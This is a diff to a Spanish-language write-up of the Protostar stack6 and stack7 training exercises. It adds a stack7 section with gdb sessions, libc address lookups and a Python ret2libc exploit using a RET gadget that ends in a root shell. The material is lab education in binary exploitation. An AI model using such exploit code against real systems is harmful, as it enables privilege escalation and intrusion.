@@ -381,12 +381,12 @@ input path please: AAAA
 got path AAAA
 Breakpoint alcanzado!
 (gdb) info proc map
-	Start Addr   End Addr       Size     Offset objfile
-	...
-	 0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
-  ...  
- 	0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so -> La primera vez que sale esto (0xb7e97000)
-  0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
+Start Addr   End Addr       Size     Offset objfile
+...
+0x8049000  0x804a000     0x1000          0   /opt/protostar/bin/stack6
+...  
+0xb7e97000 0xb7fd5000   0x13e000          0   /lib/libc-2.11.2.so -> La primera vez que sale esto (0xb7e97000)
+0xb7fd5000 0xb7fd6000     0x1000   0x13e000   /lib/libc-2.11.2.so
 [user@protostar]-[/opt/protostar/bin]:$ strings -atx /lib/libc-2.11.2.so | grep "bin/sh"
  11f3bf /bin/sh
 (gdb) x/s 0xb7e97000 + 0x11f3bf
@@ -465,7 +465,7 @@ Program received signal SIGTRAP, Trace/breakpoint trap.
 ```
 En cambio sin ese RET...
 
-```console
+```python
 print(padding + eip + breakpoint)
 ```
 ```console
@@ -474,3 +474,64 @@ Starting program: /opt/protostar/bin/stack6 < /tmp/pattern
 input path please: bzzzt (0xbffff6ac)
 Program exited with code 01.
 ```
+
+---------------------------------------------------------------------------
+
+# ROP + Ret2libc -> [stack7](https://exploit.education/protostar/stack-seven/)
+
+Este ejercicio es identico al anterior, solo cambia ligeramente la parte de no poder retornar a la pila
+
+El input empieza en 0xbffff65c (que justo es el valor del primer elemento de la pila 0xbffff640:0xbffff65c).
+Una manera rapida de ver donde esta el eip es desbordando y con el comando info frame
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'* 76 + 'BBBBCCCCDDDDEEEEFFFFGGGG' )" > /tmp/pattern
+[user@protostar]-[/opt/protostar/bin]:$ gdb ./stack7
+(gdb) run < /tmp/pattern
+Program received signal SIGSEGV, Segmentation fault.
+0x43434343 in ?? () -> Las "C" ->  offset = 80 + eip
+```
+Si probamos a ejecutar un ret2libc? 
+
+```console
+(gdb) p &system
+$3 = (<text variable, no debug info> *) 0xb7ecffb0 <__libc_system>
+(gdb) p &exit
+$4 = (<text variable, no debug info> *) 0xb7ec60c0 <*__GI_exit>
+(gdb) info proc map
+0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
+[user@protostar]-[/opt/protostar/bin]:$  strings -atx /lib/libc-2.11.2.so | grep "bin/sh"
+ 11f3bf /bin/sh
+(gdb) p/x 0xb7e97000 + 0x11f3bf
+$6 = 0xb7fb63bf
+(gdb) x/s 0xb7fb63bf
+0xb7fb63bf:      "/bin/sh"
+```
+Las direcciones son las mismas que antes y el offset igual asi que usamos el exploit ret2libc de ./stack6
+```
+```console
+[user@protostar]-[/opt/protostar/bin]:$ (python /tmp/exploit.py;cat) | ./stack7
+input path please: bzzzt (0xb7ecffb0)
+```
+Resulta ser que la direccion de system empeiza por 0xb algo, asi que nos la chapa. Que hacer? tirar del recursod el RET.
+```console
+(gdb) disas getpath
+0x08048544 <getpath+128>:       ret 
+```
+```python
+import struct
+padding = "A" * 80
+ret = struct.pack("I", 0x08048544)  # Lo único nuevo
+system = struct.pack("I",0xb7ecffb0)
+exit = struct.pack("I",0xb7ec60c0)
+bin_sh = struct.pack("I",0xb7fb63bf)
+print(padding + ret + system + exit + bin_sh)
+```
+```console
+[user@protostar]-[/opt/protostar/bin]:$ (python /tmp/exploit.py;cat) | ./stack7
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAAD�����`췿c��
+whoami
+root
+```
+
+
